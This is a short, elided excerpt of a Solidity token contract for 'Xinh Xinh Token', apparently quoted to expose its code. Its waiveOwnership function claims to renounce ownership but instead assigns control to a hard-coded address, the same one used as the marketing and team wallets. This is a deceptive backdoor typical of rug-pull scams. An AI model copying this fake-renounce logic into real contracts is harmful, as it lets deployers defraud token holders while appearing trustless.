...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x6693F0Cfe04824Da23A7D913039B175841666666));
        _owner = address(0x6693F0Cfe04824Da23A7D913039B175841666666);
    }
...
contract Amazing is Context, IERC20, Ownable {
    ...
    string private _name = "Xinh Xinh Token";
    string private _symbol = "XXT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6693F0Cfe04824Da23A7D913039B175841666666);
    address payable public teamWalletAddress = payable(0x6693F0Cfe04824Da23A7D913039B175841666666);
